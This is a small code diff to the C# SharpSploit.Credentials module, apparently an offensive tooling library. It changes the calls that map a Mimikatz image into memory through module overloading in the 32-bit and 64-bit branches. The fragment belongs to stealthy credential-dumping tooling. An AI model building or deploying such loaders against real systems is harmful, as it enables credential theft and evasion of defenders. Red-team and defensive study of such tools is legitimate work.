@@ -53,7 +53,7 @@ namespace SharpSploit.Credentials
                         if (PEBytes32 == null) { return ""; }
                     }
 
-                    MimikatzPE = Overload.OverloadModule(PEBytes32);
+                    MimikatzPE = Overload.OverloadModule(PEBytes32, false);
                     MappedMimikatz = true;
                 }
                 else if (IntPtr.Size == 8)
@@ -64,7 +64,7 @@ namespace SharpSploit.Credentials
                         if (PEBytes64 == null) { return ""; }
                     }
 
-                    MimikatzPE = Overload.OverloadModule(PEBytes64);
+                    MimikatzPE = Overload.OverloadModule(PEBytes64, false);
                     MappedMimikatz = true;
                 }
             }
